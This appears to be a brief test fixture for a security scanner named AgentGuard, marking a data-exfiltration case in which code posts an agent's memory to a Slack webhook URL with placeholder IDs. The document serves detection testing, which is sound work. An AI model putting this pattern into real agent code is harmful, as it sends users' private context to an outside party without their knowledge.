# ASI03: Data Exfiltration — webhook with data
# Vulnerability: Agent sends data to webhook URL
# Expected: AgentGuard ASI03-DATA-EXFIL MEDIUM
webhook_url = "https://hooks.slack.com/services/T000/B000/XXX"
requests.post(webhook_url, json={"text": str(agent_memory)})